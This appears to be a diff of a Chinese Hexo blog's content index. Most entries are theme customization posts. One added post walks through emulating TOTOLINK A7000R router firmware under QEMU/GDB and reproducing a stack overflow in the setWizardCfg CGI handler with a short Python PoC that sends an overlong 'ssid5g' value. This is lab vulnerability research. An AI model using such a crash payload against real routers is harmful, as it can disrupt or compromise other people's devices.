+<img src="/images/2024-10-27-hexo博客导航栏美化.assets/image-20241027223321828.png" alt="image-20241027223321828" style="zoom: 80%;" />
+</li>
+<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>添加自定义css文件</p>
+<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
+<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-27-hexo%E5%8D%9A%E5%AE%A2%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%BE%8E%E5%8C%96.assets/image-20241027225811317.png" alt="image-20241027225811317"></p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+        <tag>Hexo</tag>
+        <tag>建站</tag>
+        <tag>美化</tag>
       </tags>
   </entry>
   <entry>
@@ -1963,52 +1995,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo关闭指定页面评论</title>
-    <url>/posts/48c13ed7.html</url>
-    <content><![CDATA[<p>发现tags，categories等等页面会默认开启评论功能，因此选择将这些页面评论区关闭<br>在页面index.md中Fontmatter中添加内容即可：</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><p><img src="/images/2024-10-28-Hexo-Shutdown-Comments.assets/image-20241028120904569.png" alt="image-20241028120904569"></p>
-<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-28-Hexo-Shutdown-Comments.assets/image-20241028121032026.png" alt="image-20241028121032026"></p>
-]]></content>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>建站</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo博客导航栏美化</title>
-    <url>/posts/a5aaf96c.html</url>
-    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
-<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><p><img src="/images/2024-10-27-hexo%E5%8D%9A%E5%AE%A2%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%BE%8E%E5%8C%96.assets/image-20241027222855421.png" alt="image-20241027222855421"></p>
-<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
-<ol>
-<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
-<img src="/images/2024-10-27-hexo博客导航栏美化.assets/image-20241027223321828.png" alt="image-20241027223321828" style="zoom: 80%;" />
-</li>
-<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>添加自定义css文件</p>
-<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
-<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-27-hexo%E5%8D%9A%E5%AE%A2%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%BE%8E%E5%8C%96.assets/image-20241027225811317.png" alt="image-20241027225811317"></p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-        <tag>Hexo</tag>
-        <tag>建站</tag>
-        <tag>美化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo添加时间轴页面</title>
     <url>/posts/756843e3.html</url>
     <content><![CDATA[<p>添加一个时间轴页面，记录一下自己的建站历程</p>
@@ -2028,6 +2014,20 @@
 <figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: sitetime</span><br><span class="line"><span class="section">date: 2024-10-28 10:57:11</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2024 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-22 --&gt;</span><br><span class="line">基于hexo重新建站，使用butterfly主题</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-27 --&gt;</span><br><span class="line">美化导航栏，添加导航栏图标，添加Gittalk评论区功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-28 --&gt;</span><br><span class="line">添加时间轴功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2023 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 04-09 --&gt;</span><br><span class="line"></span><br><span class="line">基于github.io仓库和byblog创建了我的博客网站</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-28-Hexo-Add-Sitetime-Page.assets/image-20241028112943535.png" alt="image-20241028112943535"></p>
+]]></content>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>建站</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo关闭指定页面评论</title>
+    <url>/posts/48c13ed7.html</url>
+    <content><![CDATA[<p>发现tags，categories等等页面会默认开启评论功能，因此选择将这些页面评论区关闭<br>在页面index.md中Fontmatter中添加内容即可：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><p><img src="/images/2024-10-28-Hexo-Shutdown-Comments.assets/image-20241028120904569.png" alt="image-20241028120904569"></p>
+<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-28-Hexo-Shutdown-Comments.assets/image-20241028121032026.png" alt="image-20241028121032026"></p>
 ]]></content>
       <tags>
         <tag>Hexo</tag>
@@ -2161,12 +2161,11 @@
 
 
 <h2 id="QEMU用户模式-GDB-Remote"><a href="#QEMU用户模式-GDB-Remote" class="headerlink" title="QEMU用户模式+GDB Remote"></a>QEMU用户模式+GDB Remote</h2><p>使用qemu调试执行挂起</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-aarch-static ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-aarch-static -g ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>
 
 <p>gdb连接调试</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture aarch64</span></span><br><span class="line">The target architecture is set to &quot;aarch64&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
 
-<p>也没有办法下断点调试，不知道为什么</p>
 <h2 id="QEMU用户模式-GDB-Attach"><a href="#QEMU用户模式-GDB-Attach" class="headerlink" title="QEMU用户模式+GDB Attach"></a>QEMU用户模式+GDB Attach</h2><p>使用qemu用户模式启动目标程序，并使用gdb attach对应程序的pid即可</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启目标程序</span></span><br><span class="line">sudo chroot . ./qemu-aarch64-static ./usr/sbin/shttpd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找对应的程序pid</span></span><br><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      7268/./qemu-aarch64</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb attach 对应程序pid</span></span><br><span class="line">gdb-multiarch attach 7268</span><br></pre></td></tr></table></figure>
 
@@ -2255,6 +2254,126 @@
       </tags>
   </entry>
   <entry>
+    <title>TOTOLINK A7000R路由器固件调试</title>
+    <url>/posts/604570cd.html</url>
+    <content><![CDATA[<p>近期在尝试挖路由器设备的漏洞，选中了Totolink这一比较好挖洞的牌子，有一些已知漏洞想要复现一下，需要使用gdb进行调试，因此在此记录下具体过程。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.iotsec-zone.com/article/319">浅析cgi与lighttpd之间的调用过程</a></li>
+<li><a href="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/">IOT_Lighttpd</a></li>
+</ul>
+<h2 id="模拟执行目标固件"><a href="#模拟执行目标固件" class="headerlink" title="模拟执行目标固件"></a>模拟执行目标固件</h2><p>固件为MIPS架构，可以直接使用binwalk提取出文件系统。</p>
+<p>本次选择的目标为A7000R型号其中的<code>/cgi-bin/cstecgi.cgi</code>文件。</p>
+<p>使用qemu用户模式执行<code>/usr/sbin/lighttpd</code>（lighttpd与cgi文件的关系可看上面给的参考链接）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp xx/qemu-mipsel-static ./</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换根目录到squash-root文件系统</span></span><br><span class="line">sudo chroot ./ /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注：需要在www目录下执行lighttpd才能够正常运行</span></span><br><span class="line">cd www</span><br><span class="line">../qemu-mipsel-static -g 1234 ../usr/sbin/lighttpd -f ../lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>然后在宿主机执行gdb进行调试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./usr/sbin/lighttpd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture mips</span></span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以进入调试界面了</p>
+<h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>需要注意的是，漏洞存在于<code>/cgi-bin/cstecgi.cgi</code>文件中，该文件由<code>lighttpd</code>使用fork子进程的方式完成调用。因此还需要在gdb中进行额外的设置来调试<code>cstecgi.cgi</code>文件的漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set follow-fork-mode child</span><br><span class="line">set detach-on-fork off</span><br></pre></td></tr></table></figure>
+
+<p>首先在<code>lighttpd</code>的main函数下断点。确保调试正常</p>
+<p>然后寻找fork函数调用点，极有可能为cgi的启动函数，下图为在proc_open中找到的fork+execve函数，猜测可能是cgi-bin的启动函数</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107123818780.png" alt="image-20241107123818780"></p>
+<p>在execl函数处下断点，向<code>lighttpd</code>程序发送poc请求包，发现在令lighttpd继续执行后，其会直接退出，因此考虑其他方法</p>
+<h2 id="gdb-attach-进程"><a href="#gdb-attach-进程" class="headerlink" title="gdb attach 进程"></a>gdb attach 进程</h2><p>lighttpd虽然退出，但是还存在进程在监听80端口，同时web服务正常，因此考虑attach对应进程</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      380/postgres</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 172.17.178.131:50808    101.33.241.59:4443      ESTABLISHED 369/cpolar: worker</span><br></pre></td></tr></table></figure>
+
+<p>但是和之前一样，attach的是qemu进程，并不是lighttpd</p>
+<h2 id="直接调试cgi"><a href="#直接调试cgi" class="headerlink" title="直接调试cgi"></a>直接调试cgi</h2><h3 id="cgi程序运行"><a href="#cgi程序运行" class="headerlink" title="cgi程序运行"></a>cgi程序运行</h3><p>根据参考链接可以知道，如果为cgi文件提供正确的环境变量，也是可以直接运行cgi文件的。</p>
+<p>如下图，直接运行cgi文件会报错：</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107130621007.png" alt="image-20241107130621007"></p>
+<p>因此考虑为cgi提供合适的环境变量，来模拟运行，通过逆向cgi的main函数处理逻辑，得到以下环境变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export QUERY_STRING=http://127.0.0.1/index.html	# 请求url，可以触发loginAuth，Upload处理逻辑</span><br><span class="line">export CONTENT_LENGTH=3000</span><br><span class="line">export stationIp=&quot;127.0.0.1&quot;</span><br><span class="line">export REMOTE_ADDR=&quot;127.0.0.1&quot;</span><br><span class="line">export http_host=&quot;a&quot;		# 请求参数</span><br><span class="line">export UPLOAD_FILENAME=&quot;filename&quot;	# 请求参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>添加以上环境变量后，发现不再报错：</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107131013990.png" alt="image-20241107131013990"></p>
+<p>使用gdb-multiarch调试，成功断在main函数位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./www/cgi-bin/cstecgi.cgi</span><br><span class="line"></span><br><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line">pwndbg&gt; target 127.0.0.1:1234</span><br><span class="line">Undefined target command: &quot;127.0.0.1:1234&quot;.  Try &quot;help target&quot;.</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107131405460.png" alt="image-20241107131405460"></p>
+<p>继续逆向会发现cgi程序接受参数输入的方法有两种：</p>
+<ul>
+<li><p>环境变量<code>getenv</code>：从<code>lighttpd</code>程序设置好的环境变量中提取参数值</p>
+</li>
+<li><p>标准输入<code>fread</code>：从标准输入获取json变量内容，适用于<code>WebGetsVar()</code>函数。如下图所示，v11为标准输入获取的值</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107131849362.png" alt="image-20241107131849362"></p>
+</li>
+</ul>
+<h3 id="cgi程序分析"><a href="#cgi程序分析" class="headerlink" title="cgi程序分析"></a>cgi程序分析</h3><p>此处再简要概括下cgi文件main函数的主要逻辑：</p>
+<ol>
+<li><p>首先获取环境变量，分配<code>CONTENT_LENGTH</code>大小空间存储输入的JSON数据，然后判断QUERY_STRING值是否存在”action&#x3D;login”和”action&#x3D;upload”字符串，有则继续，没有则转入3</p>
+</li>
+<li><p>如果存在”action&#x3D;login”，则设置为<code>topicurl</code>为”loginAuth”，并构造请求包</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;loginAuth&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginAuthUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&amp;http_host=&#123;arg2&#125;&amp;flag=ie8&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果存在”action&#x3D;upload”，则继续获取环境变量UPLOAD_FILENAME，设置<code>topicurl</code>为QUERY_STRING第一个参数，并设置FileName等参数变量</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;FileName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg2&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContentLength&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/linux.trx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取标准输入解析出”topicurl”值，并根据”set”, “get”, “del”分类跳转到不同的handler列表，执行对应的回调函数。</p>
+</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们要测试的漏洞位于<code>setWizardCfg</code>函数，因此只需要构造以下环境变量：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export CONTENT_LENGTH=52</span><br></pre></td></tr></table></figure>
+
+<p>继续执行到fread函数，读取输入为请求参数：</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107133709164.png" alt="image-20241107133709164"></p>
+<p>输入以下payload：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;topicurl&quot;</span><span class="punctuation">:</span><span class="string">&quot;setWizardCfg&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ssid5g&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaaaaaaaaa&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意CONTENT_LENGTH与payload长度要对应：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;aaaaaaaaaa&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> chars to payload&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>读入后，我们在setWizardCfg函数设置断点，查看是否正常调用该函数：</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107134757955.png" alt="image-20241107134757955"></p>
+<p>成功断在该位置。且成功读取了我们设置的”ssid5g”参数。</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107135015692.png" alt="image-20241107135015692"></p>
+<p>然后我们就可以进行调试了，通过构造长度足够大的”ssid5g”参数，造成缓冲区溢出：</p>
+<p>poc.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># export CONTENT_LENGTH=4138</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">0x1000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">str</span>(data))&#125;</span> chars to payload&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行后断在sink函数，发现成功覆盖fp, sp寄存器后</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107135359468.png" alt="image-20241107135359468"></p>
+<p>输入过长payload造成栈溢出</p>
+<p><img src="/images/2024-11-07-TOTOLINK%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E8%B0%83%E8%AF%95.assets/image-20241107142300722.png" alt="image-20241107142300722"></p>
+]]></content>
+      <tags>
+        <tag>固件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WSL2安装Ghidra</title>
+    <url>/posts/c9ea9d94.html</url>
+    <content><![CDATA[<p>慢慢的从双系统迁移到WSL，这次试着在WSL2上安装Ghidra工具。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://qiita.com/motimotipurinn/items/4ed66dce780a886d2f32">WSLでGhidra環境構築</a></li>
+</ul>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>Windows 10</li>
+<li>WSL2-Ubuntu 22.04</li>
+</ul>
